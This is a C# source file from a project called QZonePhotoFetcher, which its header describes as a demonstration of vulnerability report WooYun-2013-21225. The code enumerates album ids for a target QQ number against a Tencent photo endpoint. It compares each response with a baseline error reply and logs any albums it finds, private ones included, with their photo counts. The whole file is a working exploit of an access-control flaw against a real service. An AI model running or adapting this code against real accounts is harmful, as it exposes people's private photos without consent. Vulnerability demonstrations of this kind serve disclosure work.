/* Copyright 2013 wenhx, https://github.com/wenhx.

   This file is part of QZonePhotoFetcher.

   QZonePhotoFetcher是WooYun-2013-21225的演示项目，只作演示用途，任何人都可以下载代码和程序，并不受限制的修改和运行，但是不可以再分发。
   WooYun-2013-21225的详细信息请看http://www.wooyun.org/bugs/wooyun-2010-021225
*/
namespace QZonePhotoFetcher
{
    using System;
    using System.Collections.Generic;
    using System.Net;
    using Newtonsoft.Json;

    public class Fetcher
    {
        public int StartFid { get; set; }
        public int EndFid { get; set; }
        public Fetcher(int startFid, int endFid)
        {
            if (startFid >= endFid)
                throw new ArgumentException();

            StartFid = startFid;
            EndFid = endFid;
        }
        static readonly string _Template = "http://photo.qq.com/cgi-bin/common/cgi_load_flash?uin={0}&fid={1}";

        public ICollection<ResponseModel> GetPhotoUrls(int qqNumber)
        {
            var errorMessage = DownloadPage(qqNumber, 99999);
            List<ResponseModel> result = new List<ResponseModel>();
            for (int i = StartFid; i < EndFid; i++)
            {
                string data = null;
                while (data == null)
                {
                    data = DownloadPage(qqNumber, i);
                }
                if (string.Equals(errorMessage, data, StringComparison.OrdinalIgnoreCase))
                {
                    LoggerHelper.WriteLine("已处理fid[{0}]，没有发现相册。", i);
                    continue;
                }

                var model = ParseData(i, data);
                if (model == null) continue;
                LoggerHelper.WriteLine("发现{0}相册《{1}》，共有相片{2}张。", model.PriveateDisplayName, model.Desc, model.Count);
                result.Add(model);
            }
            return result;
        }

        private static ResponseModel ParseData(int fid, string data)
        {
            try
            {
                var model = JsonConvert.DeserializeObject<ResponseModel>(data);
                return model;
            }
            catch (Exception ex)
            {
                LoggerHelper.WriteJsonConvertError(
                    string.Format("解析fid[{0}]时发生错误。", fid), ex, data);
                return null;
            }
        }

        static string DownloadPage(int qqNumber, int fId)
        {
            var url = string.Format(_Template, qqNumber, fId);
            try
            {
                using (WebClient client = new WebClient())
                {
                    return client.DownloadString(url);
                }
            }
            catch (Exception)
            {
                System.Diagnostics.Debug.WriteLine(string.Format("Get {0} Error!", fId));
                return null;
            }
        }
    }
}